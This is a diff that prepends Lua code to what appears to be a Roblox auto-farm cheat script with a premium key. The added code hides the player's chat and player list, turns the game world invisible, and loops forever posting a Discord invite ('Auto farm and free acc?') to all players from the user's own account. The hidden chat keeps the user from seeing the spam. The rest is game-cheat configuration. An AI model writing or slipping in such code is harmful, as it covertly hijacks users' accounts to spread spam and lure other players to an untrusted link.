@@ -1,3 +1,53 @@
+local player = game.Players.LocalPlayer
+local playerCharacter = player.Character or player.CharacterAdded:Wait()
+
+-- Função para definir transparência, ignorando o personagem do jogador
+local function setTransparency(object)
+    if not object:IsDescendantOf(playerCharacter) and object:IsA("BasePart") then
+        pcall(function()
+            object.Transparency = 1
+        end)
+    end
+end
+
+-- Aplica transparência a todos os objetos no workspace, exceto o personagem do jogador
+for _, v in ipairs(workspace:GetDescendants()) do
+    setTransparency(v)
+end
+
+-- Monitora objetos adicionados ao workspace e aplica a transparência, exceto ao personagem do jogador
+workspace.DescendantAdded:Connect(function(v)
+    setTransparency(v)
+end)
+
+-- Atualiza a referência do personagem quando o jogador reseta
+player.CharacterAdded:Connect(function(newCharacter)
+    playerCharacter = newCharacter -- Atualiza para o novo personagem do jogador
+end)
+
+local CoreGui = game:GetService("StarterGui")
+CoreGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+CoreGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+
+local mensagem = "Auto farm and free acc?
+Check this out: dc/YsR6ymwND4"
+local tempo = 100
+
+local function enviarMensagem()
+    local chatEvent = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+    if chatEvent then
+        chatEvent:FireServer(mensagem, "All")
+        print("Mensagem enviada: " .. mensagem)
+    else
+        warn("Evento de chat não encontrado.")
+    end
+end
+
+while true do
+    enviarMensagem()
+    wait(tempo)
+end
+
 -- Max level, godhuman, cdk, sgt
 script_key = "U3VLB2EKRGQJJCVX433PZM5HXGYA" -- premium only, u can leave it blank if ur not
 getgenv().Shutdown = true -- Turn on if u are farming bulk accounts
